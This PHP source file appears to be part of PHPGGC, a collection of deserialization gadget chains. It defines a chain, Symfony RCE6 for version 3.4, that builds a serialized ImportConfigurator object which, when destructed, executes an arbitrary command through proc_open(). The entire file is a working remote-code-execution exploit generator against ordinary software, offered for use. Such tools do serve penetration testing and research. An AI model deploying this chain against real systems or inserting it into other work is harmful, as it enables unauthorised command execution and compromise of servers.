<?php

namespace GadgetChain\Symfony;

class RCE6 extends \PHPGGC\GadgetChain\RCE\Command
{
    public static $version = '3.4';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';
    public static $information = 'Executes given command through proc_open()';

    public function generate(array $parameters)
    {
        $command = $parameters['command'];

        return new \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator(
        	$command
        );
    }
}
